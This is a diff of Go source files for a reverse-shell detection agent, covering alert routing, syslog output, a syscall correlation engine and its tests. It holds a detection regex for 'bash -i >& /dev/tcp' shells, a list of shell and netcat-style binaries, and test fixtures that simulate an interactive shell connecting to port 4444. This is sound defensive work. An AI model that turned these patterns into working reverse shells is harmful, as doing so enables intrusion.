+		}
+	}
+}
+
+type legacyFanout struct {
+	router *Router
+}
+
+func NewSinks(cfg Config, logger *zap.Logger) (*legacyFanout, error) {
+	sinks := make([]Sink, 0, 6)
+
+	jsonlSink, err := NewJSONLSink(cfg.JSONL, logger)
+	if err != nil {
+		return nil, err
+	}
+	sinks = append(sinks, jsonlSink)
+
+	enabled := make(map[string]struct{})
+	for _, v := range cfg.Enabled {
+		enabled[v] = struct{}{}
+	}
+
+	if _, ok := enabled["elasticsearch"]; ok {
+		es, err := NewESSink(cfg.Elasticsearch, logger)
+		if err != nil {
+			return nil, err
+		}
+		sinks = append(sinks, es)
+	}
+	if _, ok := enabled["splunk"]; ok {
+		splunk, err := NewSplunkSink(cfg.Splunk, logger)
+		if err != nil {
+			return nil, err
+		}
+		sinks = append(sinks, splunk)
+	}
+	if _, ok := enabled["kafka"]; ok {
+		k, err := NewKafkaSink(cfg.Kafka, logger)
+		if err != nil {
+			return nil, err
+		}
+		sinks = append(sinks, k)
+	}
+	if _, ok := enabled["syslog"]; ok {
+		s, err := NewSyslogSink(cfg.Syslog, logger)
+		if err != nil {
+			return nil, err
+		}
+		sinks = append(sinks, s)
+	}
+	if _, ok := enabled["webhook"]; ok {
+		w, err := NewWebhookSink(cfg.Webhook, logger)
+		if err != nil {
+			return nil, err
+		}
+		sinks = append(sinks, w)
+	}
+
+	return &legacyFanout{router: NewRouter(sinks, logger)}, nil
+}
+
+func (l *legacyFanout) Send(ctx context.Context, a *types.ReverseShellAlert) error {
+	if l == nil || l.router == nil || a == nil {
+		return nil
+	}
+	l.router.Send(ctx, convertLegacyAlert(a))
+	return nil
+}
+
+func (l *legacyFanout) Close() {
+	if l == nil || l.router == nil {
+		return
+	}
+	l.router.Flush()
+	l.router.Close()
+}
+
+func convertLegacyAlert(a *types.ReverseShellAlert) *alertpkg.ReverseShellAlert {
+	out := &alertpkg.ReverseShellAlert{
+		ID:         a.AlertID,
+		Timestamp:  a.Timestamp,
+		Severity:   a.Severity,
+		Score:      a.Confidence,
+		Pattern:    a.RuleID,
+		FiredRules: []string{a.RuleID},
+		Process: alertpkg.ProcessDetails{
+			PID:       a.Process.PID,
+			PPID:      a.Process.PPID,
+			UID:       a.Process.UID,
+			GID:       a.Process.GID,
+			ExePath:   a.Process.Exe,
+			Cmdline:   a.Process.Cmdline,
+			Comm:      a.Process.Comm,
+			StartTime: a.Timestamp,
+		},
+		Network: alertpkg.NetworkDetails{
+			RemoteIP:         a.Network.RemoteIP,
+			RemotePort:       fmt.Sprintf("%d", a.Network.RemotePort),
+			Protocol:         a.Network.Protocol,
+			ASNOrg:           a.Network.ASN,
+			Country:          a.Network.GeoIPCountry,
+			City:             a.Network.GeoIPCity,
+			ReputationScore:  a.Network.AbuseIPDBScore,
+			ThreatCategories: nil,
+		},
+		SyscallChain:       append([]string(nil), a.EventChain...),
+		MITRETechniques:    toMITRE(a.MITREAttack),
+		ForensicBundlePath: a.Forensics.MiniPCAPRef,
+		HostInfo: alertpkg.HostInfo{
+			Hostname:      metadataValue(a.Metadata, "hostname", a.HostID),
+			OS:            metadataValue(a.Metadata, "os", ""),
+			KernelVersion: metadataValue(a.Metadata, "kernel_version", ""),
+			AgentVersion:  metadataValue(a.Metadata, "agent_version", ""),
+		},
+	}
+	return out
+}
+
+func metadataValue(meta map[string]string, key string, fallback string) string {
+	if meta == nil {
+		return fallback
+	}
+	if v, ok := meta[key]; ok && v != "" {
+		return v
+	}
+	return fallback
+}
+
+func toMITRE(ids []string) []alertpkg.MITRETechnique {
+	out := make([]alertpkg.MITRETechnique, 0, len(ids))
+	for _, id := range ids {
+		out = append(out, alertpkg.MITRETechnique{ID: id, URL: "https://attack.mitre.org/techniques/" + id + "/"})
+	}
+	return out
+}
+
+=== internal/output/syslog_unix.go ===
+//go:build !windows
+
+package output
+
+import (
+	"context"
+	"crypto/tls"
+	"fmt"
+	"log/syslog"
+	"os"
+	"strconv"
+	"strings"
+	"time"
+
+	alertpkg "github.com/yoursec/rsbp/internal/alert"
+	"github.com/yoursec/rsbp/internal/types"
+	"go.uber.org/zap"
+)
+
+type SyslogConfig struct {
+	Network    string `mapstructure:"network"`
+	Address    string `mapstructure:"address"`
+	Tag        string `mapstructure:"tag"`
+	EnableTLS  bool   `mapstructure:"enable_tls"`
+	ServerName string `mapstructure:"server_name"`
+}
+
+type SyslogSink struct {
+	name   string
+	cfg    SyslogConfig
+	logger *zap.Logger
+	writer *syslog.Writer
+}
+
+func NewSyslogSink(cfg SyslogConfig, logger *zap.Logger) (*SyslogSink, error) {
+	if cfg.Network == "" {
+		cfg.Network = "udp"
+	}
+	if cfg.Address == "" {
+		cfg.Address = "127.0.0.1:514"
+	}
+	if cfg.Tag == "" {
+		cfg.Tag = "RSBP"
+	}
+	if logger == nil {
+		logger = zap.NewNop()
+	}
+
+	s := &SyslogSink{name: "syslog", cfg: cfg, logger: logger}
+	if !cfg.EnableTLS {
+		w, err := syslog.Dial(cfg.Network, cfg.Address, syslog.LOG_LOCAL0|syslog.LOG_INFO, cfg.Tag)
+		if err != nil {
+			return nil, err
+		}
+		s.writer = w
+	}
+	return s, nil
+}
+
+func (s *SyslogSink) Name() string { return s.name }
+
+func (s *SyslogSink) Send(_ context.Context, a *alertpkg.ReverseShellAlert) error {
+	if a == nil {
+		return nil
+	}
+	msg := formatSyslogMessage(a)
+	if s.cfg.EnableTLS {
+		return s.sendTLS(msg)
+	}
+
+	sev := mapSeverity(a.Severity)
+	switch sev {
+	case syslog.LOG_CRIT:
+		return s.writer.Crit(msg)
+	case syslog.LOG_WARNING:
+		return s.writer.Warning(msg)
+	default:
+		return s.writer.Info(msg)
+	}
+}
+
+func (s *SyslogSink) Flush() error { return nil }
+
+func (s *SyslogSink) Close() error {
+	if s.writer != nil {
+		return s.writer.Close()
+	}
+	return nil
+}
+
+func (s *SyslogSink) sendTLS(msg string) error {
+	conn, err := tls.Dial("tcp", s.cfg.Address, &tls.Config{ServerName: s.cfg.ServerName})
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
+	_, err = conn.Write([]byte(msg + "\n"))
+	return err
+}
+
+func mapSeverity(sev types.AlertSeverity) syslog.Priority {
+	s := strings.ToLower(string(sev))
+	switch s {
+	case "critical":
+		return syslog.LOG_CRIT
+	case "high":
+		return syslog.LOG_WARNING
+	case "medium":
+		return syslog.LOG_NOTICE
+	default:
+		return syslog.LOG_INFO
+	}
+}
+
+func formatSyslogMessage(a *alertpkg.ReverseShellAlert) string {
+	mitre := make([]string, 0, len(a.MITRETechniques))
+	for _, t := range a.MITRETechniques {
+		mitre = append(mitre, t.ID)
+	}
+	hostname := a.HostInfo.Hostname
+	if strings.TrimSpace(hostname) == "" {
+		hostname = "-"
+	}
+	ts := a.Timestamp.UTC().Format(time.RFC3339)
+	procID := strconv.Itoa(os.Getpid())
+	msgID := "rsbp-alert"
+	structured := fmt.Sprintf(
+		"[rsbp@32473 alert_id=\"%s\" severity=\"%s\" score=\"%.2f\" pid=\"%d\" remote_ip=\"%s\" remote_port=\"%s\" mitre=\"%s\"]",
+		a.ID,
+		strings.ToUpper(string(a.Severity)),
+		a.Score,
+		a.Process.PID,
+		a.Network.RemoteIP,
+		a.Network.RemotePort,
+		strings.Join(mitre, ","),
+	)
+	msg := fmt.Sprintf("exe=%s country=%s pattern=%s", a.Process.ExePath, a.Network.Country, a.Pattern)
+	return fmt.Sprintf("<134>1 %s %s RSBP %s %s %s %s", ts, hostname, procID, msgID, structured, msg)
+}
+
+=== internal/correlation/engine.go ===
+package correlation
+
+import (
+	"context"
+	"fmt"
+	"net"
+	"regexp"
+	"strings"
+	"sync"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+const (
+	sysExecve  = 59
+	sysSocket  = 41
+	sysConnect = 42
+	sysDup2    = 33
+	sysDup3    = 292
+	sysFork    = 57
+	sysClone3  = 435
+	sysPipe    = 22
+	sysPipe2   = 293
+)
+
+var devTCPPattern = regexp.MustCompile(`bash.*-i.*>&.*/dev/tcp/(\d+\.\d+\.\d+\.\d+)/(\d+)`)
+
+type parentSocketState struct {
+	SocketFD   int32
+	RemoteIP   net.IP
+	RemotePort uint16
+	UpdatedAt  time.Time
+}
+
+type Engine struct {
+	sessions        sync.Map
+	emittedSessions sync.Map
+	parentSocketMap sync.Map
+	forkSeen        sync.Map
+	pipeSeen        sync.Map
+	windowDuration  time.Duration
+	ticker          *time.Ticker
+	output          chan<- *SessionState
+	logger          *zap.Logger
+}
+
+const emittedSessionTTL = 5 * time.Minute
+
+func New(window time.Duration, out chan<- *SessionState, log *zap.Logger) *Engine {
+	if window <= 0 {
+		window = 5 * time.Second
+	}
+	if log == nil {
+		log = zap.NewNop()
+	}
+
+	return &Engine{
+		windowDuration: window,
+		ticker:         time.NewTicker(30 * time.Second),
+		output:         out,
+		logger:         log,
+	}
+}
+
+func (e *Engine) Process(event types.SyscallEvent) {
+	if e == nil {
+		return
+	}
+
+	e.logger.Debug("correlation received event",
+		zap.Uint32("pid", event.PID),
+		zap.Uint32("syscall_nr", event.SyscallNr),
+	)
+
+	pid := event.PID
+	now := timestampToTime(event.TimestampNS)
+
+	session := e.getOrCreateSession(event, now)
+	session.PPID = event.PPID
+	session.UID = event.UID
+	session.GID = event.GID
+	session.LastUpdate = now
+
+	e.upsertProcessNode(session, event, now)
+
+	switch event.SyscallNr {
+	case sysExecve:
+		session.HasExecve = true
+		exe := cString(event.ExecPath[:])
+		args := cString(event.Args[:])
+		if exe != "" {
+			session.ExePath = exe
+		} else {
+			session.ExePath = commToString(event.Comm)
+		}
+		if args != "" {
+			session.Cmdline = args
+		}
+
+		if inherited, ok := e.parentSocketMap.Load(session.PPID); ok {
+			p := inherited.(parentSocketState)
+			if !session.HasSocket && p.SocketFD >= 0 {
+				session.SocketFD = p.SocketFD
+				session.HasSocket = true
+			}
+			if !session.HasConnect && p.RemoteIP != nil && p.RemotePort != 0 {
+				session.RemoteIP = append(net.IP(nil), p.RemoteIP...)
+				session.RemotePort = p.RemotePort
+				session.HasConnect = true
+			}
+		}
+
+	case sysSocket:
+		session.HasSocket = true
+		session.SocketFD = event.FD
+		e.parentSocketMap.Store(pid, parentSocketState{
+			SocketFD:  event.FD,
+			UpdatedAt: now,
+		})
+
+	case sysConnect:
+		session.HasConnect = true
+		session.SocketFD = event.FD
+		ip := ipFromFields(event.Family, event.RemoteIP4, event.RemoteIP6)
+		if ip != nil {
+			session.RemoteIP = ip
+		}
+		if event.RemotePort != 0 {
+			session.RemotePort = event.RemotePort
+		}
+		e.parentSocketMap.Store(pid, parentSocketState{
+			SocketFD:   session.SocketFD,
+			RemoteIP:   append(net.IP(nil), session.RemoteIP...),
+			RemotePort: session.RemotePort,
+			UpdatedAt:  now,
+		})
+
+	case sysDup2, sysDup3:
+		if event.HasDup2Stdio != 0 {
+			session.HasDupToStdio = true
+		}
+
+	case sysFork, sysClone3:
+		e.forkSeen.Store(pid, true)
+		if _, ok := e.pipeSeen.Load(pid); ok {
+			session.HasForkWithPipe = true
+		}
+
+	case sysPipe, sysPipe2:
+		e.pipeSeen.Store(pid, true)
+		if _, ok := e.forkSeen.Load(pid); ok {
+			session.HasForkWithPipe = true
+		}
+	}
+
+	session.Category = session.CategoryDetect()
+	e.sessions.Store(pid, session)
+
+	if session.IsComplete() {
+		e.logger.Info("SESSION COMPLETE - emitting alert",
+			zap.Uint32("pid", session.PID),
+			zap.String("exe", session.ExePath),
+		)
+	}
+
+	e.maybeEmit(session)
+}
+
+func (e *Engine) maybeEmit(session *SessionState) {
+	if e == nil || session == nil || e.output == nil {
+		return
+	}
+	e.cleanupEmitted(time.Now())
+	if session.LastUpdate.Sub(session.StartTime) > e.windowDuration {
+		return
+	}
+	if !session.IsComplete() {
+		return
+	}
+
+	key := emittedSessionKey(session)
+	if existing, exists := e.emittedSessions.Load(key); exists {
+		if t, ok := existing.(time.Time); ok {
+			if time.Since(t) < emittedSessionTTL {
+				return
+			}
+		}
+	}
+	e.emittedSessions.Store(key, time.Now())
+
+	copyState := deepCopySession(session)
+	select {
+	case e.output <- copyState:
+	default:
+		e.logger.Warn("correlation output channel full, dropping session", zap.Uint32("pid", session.PID))
+	}
+}
+
+func (e *Engine) cleanup() {
+	if e == nil {
+		return
+	}
+
+	cutoff := time.Now().Add(-2 * e.windowDuration)
+	e.sessions.Range(func(key, value any) bool {
+		pid, ok := key.(uint32)
+		if !ok {
+			return true
+		}
+		session, ok := value.(*SessionState)
+		if !ok {
+			e.sessions.Delete(key)
+			return true
+		}
+
+		if session.LastUpdate.Before(cutoff) && !session.IsComplete() {
+			e.sessions.Delete(pid)
+			e.parentSocketMap.Delete(pid)
+			e.forkSeen.Delete(pid)
+			e.pipeSeen.Delete(pid)
+		}
+		return true
+	})
+	e.cleanupEmitted(time.Now())
+}
+
+func (e *Engine) cleanupEmitted(now time.Time) {
+	e.emittedSessions.Range(func(key, value any) bool {
+		ts, ok := value.(time.Time)
+		if !ok {
+			e.emittedSessions.Delete(key)
+			return true
+		}
+		if now.Sub(ts) > emittedSessionTTL {
+			e.emittedSessions.Delete(key)
+		}
+		return true
+	})
+}
+
+func emittedSessionKey(session *SessionState) string {
+	if session == nil {
+		return ""
+	}
+	remoteIP := ""
+	if session.RemoteIP != nil {
+		remoteIP = session.RemoteIP.String()
+	}
+	pattern := ""
+	if p := BestMatchPattern(session); p != nil {
+		pattern = p.Name
+	}
+	if pattern == "" {
+		pattern = fmt.Sprintf("cat-%d", session.CategoryDetect())
+	}
+	return fmt.Sprintf("%d|%s|%s", session.PID, remoteIP, pattern)
+}
+
+func (e *Engine) Run(ctx context.Context, events <-chan types.SyscallEvent) {
+	if e == nil {
+		return
+	}
+
+	cleanupDone := make(chan struct{})
+	go func() {
+		defer close(cleanupDone)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-e.ticker.C:
+				e.cleanup()
+			}
+		}
+	}()
+
+	for {
+		select {
+		case <-ctx.Done():
+			e.ticker.Stop()
+			<-cleanupDone
+			return
+		case ev, ok := <-events:
+			if !ok {
+				e.ticker.Stop()
+				<-cleanupDone
+				return
+			}
+			e.Process(ev)
+		}
+	}
+}
+
+func (e *Engine) getOrCreateSession(event types.SyscallEvent, now time.Time) *SessionState {
+	if existing, ok := e.sessions.Load(event.PID); ok {
+		if s, castOK := existing.(*SessionState); castOK {
+			return s
+		}
+	}
+
+	s := &SessionState{
+		PID:         event.PID,
+		PPID:        event.PPID,
+		UID:         event.UID,
+		GID:         event.GID,
+		SocketFD:    -1,
+		StartTime:   now,
+		LastUpdate:  now,
+		ProcessTree: make([]ProcessNode, 0, 4),
+	}
+	e.sessions.Store(event.PID, s)
+	return s
+}
+
+func (e *Engine) upsertProcessNode(session *SessionState, event types.SyscallEvent, now time.Time) {
+	if session == nil {
+		return
+	}
+	if len(session.ProcessTree) > 0 {
+		last := session.ProcessTree[len(session.ProcessTree)-1]
+		if last.PID == event.PID && last.PPID == event.PPID {
+			return
+		}
+	}
+
+	session.ProcessTree = append(session.ProcessTree, ProcessNode{
+		PID:       event.PID,
+		PPID:      event.PPID,
+		Comm:      commToString(event.Comm),
+		ExePath:   cString(event.ExecPath[:]),
+		StartTime: now,
+	})
+}
+
+func deepCopySession(in *SessionState) *SessionState {
+	if in == nil {
+		return nil
+	}
+	out := *in
+	if in.RemoteIP != nil {
+		out.RemoteIP = append(net.IP(nil), in.RemoteIP...)
+	}
+	out.ProcessTree = append([]ProcessNode(nil), in.ProcessTree...)
+	return &out
+}
+
+func timestampToTime(ns uint64) time.Time {
+	if ns == 0 {
+		return time.Now().UTC()
+	}
+	return time.Unix(0, int64(ns)).UTC()
+}
+
+func ipFromFields(family uint16, ip4 uint32, ip6 [16]byte) net.IP {
+	if family == 2 {
+		if ip4 == 0 {
+			return nil
+		}
+		v4 := []byte{byte(ip4), byte(ip4 >> 8), byte(ip4 >> 16), byte(ip4 >> 24)}
+		return net.IPv4(v4[0], v4[1], v4[2], v4[3])
+	}
+	if family == 10 {
+		allZero := true
+		for i := 0; i < 16; i++ {
+			if ip6[i] != 0 {
+				allZero = false
+				break
+			}
+		}
+		if allZero {
+			return nil
+		}
+		ip := make(net.IP, 16)
+		copy(ip, ip6[:])
+		return ip
+	}
+	return nil
+}
+
+func commToString(in [16]byte) string {
+	b := in[:]
+	for i := range b {
+		if b[i] == 0 {
+			return strings.TrimSpace(string(b[:i]))
+		}
+	}
+	return strings.TrimSpace(string(b))
+}
+
+func cString(buf []byte) string {
+	for i := range buf {
+		if buf[i] == 0 {
+			buf = buf[:i]
+			break
+		}
+	}
+	return strings.TrimSpace(string(buf))
+}
+
+type Tracker struct {
+	engine *Engine
+}
+
+func NewTracker(ttl time.Duration) *Tracker {
+	return &Tracker{engine: New(ttl, nil, zap.NewNop())}
+}
+
+func (t *Tracker) Consume(ev types.SyscallEvent) *SessionState {
+	if t == nil || t.engine == nil {
+		return nil
+	}
+	t.engine.Process(ev)
+	v, ok := t.engine.sessions.Load(ev.PID)
+	if !ok {
+		return nil
+	}
+	s, ok := v.(*SessionState)
+	if !ok {
+		return nil
+	}
+	copyState := deepCopySession(s)
+	if copyState == nil {
+		return nil
+	}
+	copyState.Category = copyState.CategoryDetect()
+	return copyState
+}
+
+func (e *Engine) DebugSnapshot(pid uint32) (string, bool) {
+	v, ok := e.sessions.Load(pid)
+	if !ok {
+		return "", false
+	}
+	s, ok := v.(*SessionState)
+	if !ok {
+		return "", false
+	}
+	return fmt.Sprintf("pid=%d ppid=%d category=%d complete=%t", s.PID, s.PPID, s.CategoryDetect(), s.IsComplete()), true
+}
+
+=== internal/correlation/session.go ===
+package correlation
+
+import (
+	"net"
+	"path/filepath"
+	"strings"
+	"sync/atomic"
+	"time"
+)
+
+type ProcessNode struct {
+	PID       uint32    `json:"pid"`
+	PPID      uint32    `json:"ppid"`
+	Comm      string    `json:"comm"`
+	ExePath   string    `json:"exe_path"`
+	StartTime time.Time `json:"start_time"`
+}
+
+type SessionState struct {
+	PID             uint32        `json:"pid"`
+	PPID            uint32        `json:"ppid"`
+	UID             uint32        `json:"uid"`
+	GID             uint32        `json:"gid"`
+	ExePath         string        `json:"exe_path"`
+	Cmdline         string        `json:"cmdline"`
+	SocketFD        int32         `json:"socket_fd"`
+	RemoteIP        net.IP        `json:"remote_ip"`
+	RemotePort      uint16        `json:"remote_port"`
+	HasExecve       bool          `json:"has_execve"`
+	HasSocket       bool          `json:"has_socket"`
+	HasConnect      bool          `json:"has_connect"`
+	HasDupToStdio   bool          `json:"has_dup_to_stdio"`
+	HasForkWithPipe bool          `json:"has_fork_with_pipe"`
+	StartTime       time.Time     `json:"start_time"`
+	LastUpdate      time.Time     `json:"last_update"`
+	Category        int           `json:"category"`
+	ProcessTree     []ProcessNode `json:"process_tree"`
+}
+
+var ShellBinaries = map[string]struct{}{
+	"sh":               {},
+	"bash":             {},
+	"zsh":              {},
+	"dash":             {},
+	"ksh":              {},
+	"fish":             {},
+	"python":           {},
+	"python3":          {},
+	"perl":             {},
+	"ruby":             {},
+	"nc":               {},
+	"ncat":             {},
+	"ncat.traditional": {},
+	"netcat":           {},
+	"socat":            {},
+	"busybox":          {},
+	"awk":              {},
+	"lua":              {},
+	"php":              {},
+	"node":             {},
+	"nodejs":           {},
+}
+
+var allowPrivateRemoteFlag atomic.Bool
+
+func init() {
+	allowPrivateRemoteFlag.Store(true)
+}
+
+func SetAllowPrivateRemote(allow bool) {
+	allowPrivateRemoteFlag.Store(allow)
+}
+
+func IsShellBinary(name string) bool {
+	if name == "" {
+		return false
+	}
+	base := strings.ToLower(filepath.Base(strings.TrimSpace(name)))
+	_, ok := ShellBinaries[base]
+	return ok
+}
+
+func (s *SessionState) CategoryDetect() int {
+	if s == nil {
+		return 0
+	}
+
+	if s.HasExecve && s.HasSocket && s.HasConnect && s.HasDupToStdio && IsShellBinary(s.ExePath) {
+		return 1
+	}
+	if s.HasExecve && s.HasConnect && isNetcatExe(s.ExePath) {
+		return 1
+	}
+	if s.HasForkWithPipe && s.HasDupToStdio && s.HasExecve {
+		return 2
+	}
+	if s.HasForkWithPipe && s.HasExecve {
+		return 3
+	}
+
+	return 0
+}
+
+func (s *SessionState) IsComplete() bool {
+	if s == nil {
+		return false
+	}
+
+	cat := s.CategoryDetect()
+	s.Category = cat
+
+	if !allowPrivateRemoteFlag.Load() && !isPublicRemoteIP(s.RemoteIP) {
+		return false
+	}
+
+	if s.HasExecve && s.HasDupToStdio {
+		return true
+	}
+	if s.HasExecve && s.HasConnect && s.RemotePort != 0 && s.RemotePort != 443 {
+		return true
+	}
+	return false
+}
+
+func isNetcatExe(exe string) bool {
+	base := strings.ToLower(filepath.Base(strings.TrimSpace(exe)))
+	return strings.Contains(base, "nc") || strings.Contains(base, "ncat") || strings.Contains(base, "netcat")
+}
+
+func isPublicRemoteIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	ip = ip.To16()
+	if ip == nil {
+		return false
+	}
+
+	if ip.IsLoopback() || ip.IsUnspecified() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
+		return false
+	}
+
+	if v4 := ip.To4(); v4 != nil {
+		if v4[0] == 10 {
+			return false
+		}
+		if v4[0] == 172 && v4[1] >= 16 && v4[1] <= 31 {
+			return false
+		}
+		if v4[0] == 192 && v4[1] == 168 {
+			return false
+		}
+	}
+
+	return true
+}
+
+=== internal/correlation/engine_test.go ===
+package correlation
+
+import (
+	"net"
+	"testing"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestEngineEmitsCompleteSessionOncePerKey(t *testing.T) {
+	SetAllowPrivateRemote(true)
+	out := make(chan *SessionState, 8)
+	eng := New(5*time.Second, out, zap.NewNop())
+
+	events := []types.SyscallEvent{
+		mkEvent(1001, 59, "/bin/bash", "bash -i", 0, "", 0),
+		mkEvent(1001, 42, "/bin/bash", "", 3, "1.2.3.4", 4444),
+		mkDupEvent(1001),
+		mkDupEvent(1001),
+	}
+	for _, ev := range events {
+		eng.Process(ev)
+	}
+
+	emitted := 0
+	drain(out, &emitted)
+	if emitted != 1 {
+		t.Fatalf("expected single emission, got %d", emitted)
+	}
+
+	eng.Process(mkDupEvent(1001))
+	drain(out, &emitted)
+	if emitted != 1 {
+		t.Fatalf("expected dedupe to suppress repeat emit, got %d", emitted)
+	}
+}
+
+func TestEngineAllowsSecondEmitForDifferentRemoteIP(t *testing.T) {
+	SetAllowPrivateRemote(true)
+	out := make(chan *SessionState, 8)
+	eng := New(5*time.Second, out, zap.NewNop())
+
+	for _, ev := range []types.SyscallEvent{
+		mkEvent(2001, 59, "/bin/bash", "bash -i", 0, "", 0),
+		mkEvent(2001, 42, "/bin/bash", "", 3, "1.2.3.4", 4444),
+		mkDupEvent(2001),
+	} {
+		eng.Process(ev)
+	}
+
+	emitted := 0
+	drain(out, &emitted)
+	if emitted != 1 {
+		t.Fatalf("expected first emission, got %d", emitted)
+	}
+
+	for _, ev := range []types.SyscallEvent{
+		mkEvent(2001, 42, "/bin/bash", "", 3, "5.6.7.8", 5555),
+		mkDupEvent(2001),
+	} {
+		eng.Process(ev)
+	}
+	drain(out, &emitted)
+	if emitted != 2 {
+		t.Fatalf("expected second emission for new remote ip, got %d", emitted)
+	}
+}
+
+func TestPrivateRemoteFilterConfigurable(t *testing.T) {
+	SetAllowPrivateRemote(false)
+	defer SetAllowPrivateRemote(true)
+
+	s := &SessionState{
+		PID:           3001,
+		ExePath:       "/bin/bash",
+		HasExecve:     true,
+		HasConnect:    true,
+		HasDupToStdio: true,
+		RemoteIP:      net.ParseIP("192.168.1.10"),
+		RemotePort:    4444,
+	}
+	if s.IsComplete() {
+		t.Fatalf("expected private remote to be blocked when filter disabled")
+	}
+}
+
+func mkDupEvent(pid uint32) types.SyscallEvent {
+	ev := mkEvent(pid, 33, "/bin/bash", "", 3, "", 0)
+	ev.HasDup2Stdio = 1
+	return ev
+}
+
+func mkEvent(pid uint32, syscall uint32, exe string, args string, fd int32, ip string, port uint16) types.SyscallEvent {
+	ev := types.SyscallEvent{
+		PID:         pid,
+		PPID:        1,
+		UID:         1000,
+		GID:         1000,
+		SyscallNr:   syscall,
+		FD:          fd,
+		TimestampNS: uint64(time.Now().UnixNano()),
+		Family:      2,
+	}
+	copy(ev.ExecPath[:], []byte(exe))
+	copy(ev.Args[:], []byte(args))
+	copy(ev.Comm[:], []byte("bash"))
+	if ip != "" {
+		v4 := net.ParseIP(ip).To4()
+		if v4 != nil {
+			ev.RemoteIP4 = uint32(v4[0]) | uint32(v4[1])<<8 | uint32(v4[2])<<16 | uint32(v4[3])<<24
+			ev.RemotePort = port
+		}
+	}
+	return ev
+}
+
+func drain(ch <-chan *SessionState, count *int) {
+	for {
+		select {
+		case <-ch:
+			*count = *count + 1
+		default:
+			return
+		}
+	}
+}
+
+=== internal/correlation/session_test.go ===
+package correlation
+
+import (
+	"context"
+	"net"
+	"testing"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestHelpersAndPatternSelection(t *testing.T) {
+	if !IsShellBinary("/bin/bash") {
+		t.Fatalf("expected bash to be recognized as shell binary")
+	}
+	if IsShellBinary("/usr/bin/code") {
+		t.Fatalf("did not expect code to be recognized as shell binary")
+	}
+
+	state := &SessionState{
+		ExePath:       "/usr/bin/python3",
+		Cmdline:       "python3 -c import socket",
+		HasExecve:     true,
+		HasSocket:     true,
+		HasConnect:    true,
+		HasDupToStdio: true,
+		RemoteIP:      net.ParseIP("8.8.8.8"),
+		RemotePort:    4444,
+	}
+	if best := BestMatchPattern(state); best == nil || best.Name == "" {
+		t.Fatalf("expected best pattern match")
+	}
+
+	if !isPublicRemoteIP(net.ParseIP("8.8.8.8")) {
+		t.Fatalf("expected public IP to be accepted")
+	}
+	if isPublicRemoteIP(net.ParseIP("10.0.0.7")) {
+		t.Fatalf("expected private IP to be rejected")
+	}
+}
+
+func TestEngineRunCleanupAndDebugSnapshot(t *testing.T) {
+	out := make(chan *SessionState, 8)
+	eng := New(2*time.Second, out, zap.NewNop())
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	in := make(chan types.SyscallEvent, 4)
+	go eng.Run(ctx, in)
+
+	ev := types.SyscallEvent{PID: 9001, PPID: 1, SyscallNr: 59, TimestampNS: uint64(time.Now().UnixNano())}
+	copy(ev.ExecPath[:], []byte("/bin/bash"))
+	in <- ev
+	close(in)
+	time.Sleep(20 * time.Millisecond)
+
+	snap, ok := eng.DebugSnapshot(9001)
+	if !ok || snap == "" {
+		t.Fatalf("expected debug snapshot for pid=9001")
+	}
+
+	stale := &SessionState{
+		PID:        9999,
+		ExePath:    "/bin/bash",
+		HasExecve:  true,
+		StartTime:  time.Now().Add(-10 * time.Second),
+		LastUpdate: time.Now().Add(-10 * time.Second),
+	}
+	eng.sessions.Store(uint32(9999), stale)
+	eng.cleanup()
+	if _, found := eng.sessions.Load(uint32(9999)); found {
+		t.Fatalf("expected stale incomplete session to be cleaned up")
+	}
+}
+
+func TestTrackerConsumeAndEngineNilSafety(t *testing.T) {
+	var eng *Engine
+	eng.Process(types.SyscallEvent{})
+	eng.Run(context.Background(), nil)
+
+	tracker := NewTracker(5 * time.Second)
+	ev := types.SyscallEvent{
+		PID:         7777,
+		PPID:        1,
+		SyscallNr:   59,
+		TimestampNS: uint64(time.Now().UnixNano()),
+	}
+	copy(ev.ExecPath[:], []byte("/bin/bash"))
+	copy(ev.Args[:], []byte("bash -i"))
+	state := tracker.Consume(ev)
+	if state == nil {
+		t.Fatalf("expected tracker to return state")
+	}
+}
+
+func TestLowLevelHelpers(t *testing.T) {
+	now := timestampToTime(0)
+	if now.IsZero() {
+		t.Fatalf("timestampToTime(0) should return current time")
+	}
+
+	specific := timestampToTime(uint64(time.Unix(12, 34).UnixNano()))
+	if specific.Unix() != 12 {
+		t.Fatalf("expected unix seconds 12, got %d", specific.Unix())
+	}
+
+	v4 := uint32(1) | uint32(2)<<8 | uint32(3)<<16 | uint32(4)<<24
+	if got := ipFromFields(2, v4, [16]byte{}).String(); got != "1.2.3.4" {
+		t.Fatalf("unexpected ipv4 decode: %s", got)
+	}
+
+	var raw6 [16]byte
+	raw6[0], raw6[15] = 0x20, 0x01
+	if ipFromFields(10, 0, raw6) == nil {
+		t.Fatalf("expected ipv6 decode")
+	}
+
+	if ipFromFields(10, 0, [16]byte{}) != nil {
+		t.Fatalf("expected all-zero address to decode as nil")
+	}
+
+	var comm [16]byte
+	copy(comm[:], []byte("bash\x00unused"))
+	if got := commToString(comm); got != "bash" {
+		t.Fatalf("unexpected comm string: %s", got)
+	}
+}
+
+=== internal/detection/engine.go ===
+package detection
+
+import (
+	"crypto/sha1"
+	"encoding/hex"
+	"fmt"
+	"net"
+	"path"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+const (
+	sysExecve  = 59
+	sysSocket  = 41
+	sysConnect = 42
+	sysDup2    = 33
+	sysFork    = 57
+	sysClone   = 56
+	sysPipe    = 22
+	sysPipe2   = 293
+)
+
+type Config struct {
+	ExecConnectWindowSeconds int     `mapstructure:"exec_connect_window_seconds"`
+	MinScore                 float64 `mapstructure:"min_score"`
+	EnableBaseline           bool    `mapstructure:"enable_baseline"`
+	BaselineFile             string  `mapstructure:"baseline_file"`
+	Whitelist                WhitelistConfig
+}
+
+type WhitelistConfig struct {
+	Paths        []string
+	IPs          []string
+	Users        []uint32
+	ProcessNames []string
+}
+
